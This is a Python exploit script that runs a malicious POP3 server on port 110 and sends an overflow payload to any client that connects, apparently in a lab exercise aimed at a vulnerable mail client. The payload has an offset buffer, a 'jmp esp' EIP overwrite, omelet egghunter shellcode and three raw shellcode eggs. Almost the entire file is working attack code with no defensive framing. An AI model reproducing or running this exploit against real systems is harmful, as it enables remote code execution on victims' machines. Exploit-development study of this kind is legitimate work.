import socket
import struct
#2000 pattern
totalbuffer = 2000
#pattern = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co"
ip = "10.0.2.5"
offset = "\x41" * (724 - len(ip))
print "length of offset :" + str(len(offset))
# jmp esp at 0x7e429353
#eip = "\x42" * 4
eip = struct.pack('<I',0x7e429353)
# put omelet code after jmp esp 
# it cant read EDI because it was xor -ed
# replace first two bytes with nops instead so we can start with edi and edi is located behind the egg (AAAAAAAAAAAAAAAAAAAAA.........)
omelet_code = ("\xbb\xfd\xff\xff\xff" #put 0xfffffffd in ebx
"\xEB\x2C\x51\x64\x89\x20\xFC\xB0\x7A\xF2\xAE\x50"
"\x89\xFE\xAD\x35\xFF\x55\xDA\xBA\x83\xF8\x03\x77"
"\x15\x59\xF7\xE9\x64\x03\x42\x08\x97\xF3\xA4"
"\x81\xFB\xFF\xFF\xFF\xFF" # compare ebx with FFFFFFFF
"\x74\x2B" # if EBX is FFFFFFFF jump to shellcode
"\x43" # if not, increase EBX and continue
"\x89\xF7\x31\xC0\x64\x8B\x08\x89\xCC\x59\x81\xF9"
"\xFF\xFF\xFF\xFF\x75\xF5\x5A\xE8\xBE\xFF\xFF\xFF"
"\x61\x8D\x66\x18\x58\x66\x0D\xFF\x0F\x40\x78\x06"
"\x97\xE9\xD8\xFF\xFF\xFF\x31\xC0\x64\xFF\x50\x08")

#some padding to assume that the shellcode is somewhere else in the memory
padding = "\x90" * 1000
#add also garbage between eggs
garbage = "meow meow meow meow meow" * 10

egg0 = "\x7A\xFF\x55\xDA\xBA\xDB\xC4\xBA\xB5\x17\x59\xF1\xD9\x74\x24\xF4\x5E\x33\xC9\xB1\x52\x31\x56\x17\x83\xEE\xFC\x03\xE3\x04\xBB\x04\xF7\xC3\xB9\xE7\x07\x14\xDE\x6E\xE2\x25\xDE\x15\x67\x15\xEE\x5E\x25\x9A\x85\x33\xDD\x29\xEB\x9B\xD2\x9A\x46\xFA\xDD\x1B\xFA\x3E\x7C\x98\x01\x13\x5E\xA1\xC9\x66\x9F\xE6\x34\x8A\xCD\xBF\x33\x39\xE1\xB4\x0E\x82\x8A\x87\x9F\x82\x6F\x5F\xA1\xA3\x3E\xEB\xF8\x63\xC1\x38\x71\x2A\xD9\x5D\xBC\xE4\x52\x95\x4A\xF7\xB2\xE7\xB3\x54\xFB\xC7\x41\xA4\x3C\xEF\xB9\xD3\x34\x13\x47\xE4\x83\x69\x93"
egg1 = "\x7A\xFE\x55\xDA\xBA\x61\x17\xC9\x50\xD1\xF3\xEB\xB5\x84\x70\xE7\x72\xC2\xDE\xE4\x85\x07\x55\x10\x0D\xA6\xB9\x90\x55\x8D\x1D\xF8\x0E\xAC\x04\xA4\xE1\xD1\x56\x07\x5D\x74\x1D\xAA\x8A\x05\x7C\xA3\x7F\x24\x7E\x33\xE8\x3F\x0D\x01\xB7\xEB\x99\x29\x30\x32\x5E\x4D\x6B\x82\xF0\xB0\x94\xF3\xD9\x76\xC0\xA3\x71\x5E\x69\x28\x81\x5F\xBC\xFF\xD1\xCF\x6F\x40\x81\xAF\xDF\x28\xCB\x3F\x3F\x48\xF4\x95\x28\xE3\x0F\x7E\x5D\xF4\x0D\x7B\x09\xF6\x11\x82\x72\x7F\xF7\xEE\x94\xD6\xA0\x86\x0D\x73\x3A\x36\xD1\xA9\x47\x78\x59\x5E\xB8"
egg2 = "\x7A\xFD\x55\xDA\xBA\x37\xAA\x2B\xAA\xA0\x5A\x66\x90\x67\x64\x5C\xBC\xE4\xF7\x3B\x3C\x62\xE4\x93\x6B\x23\xDA\xED\xF9\xD9\x45\x44\x1F\x20\x13\xAF\x9B\xFF\xE0\x2E\x22\x8D\x5D\x15\x34\x4B\x5D\x11\x60\x03\x08\xCF\xDE\xE5\xE2\xA1\x88\xBF\x59\x68\x5C\x39\x92\xAB\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40"


payload = offset + eip + omelet_code + padding + egg0 + garbage + egg1 + garbage + egg2

with open("egg0.bin", 'w') as outfile:
    outfile.write(egg0)

with open("egg1.bin", 'w') as outfile:
    outfile.write(egg1)

with open("egg2.bin", 'w') as outfile:
    outfile.write(egg2)


try:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.bind(('',110))
	s.listen(1)
	print '[*] Listener is up on port 110'
	conn, addr = s.accept()

	while 1:
		print '[*] Sending buffer '
		conn.send('-ERR'+payload)
	conn.close()
except:
	print '[*] idk what happened, maybe your code just sucks...'
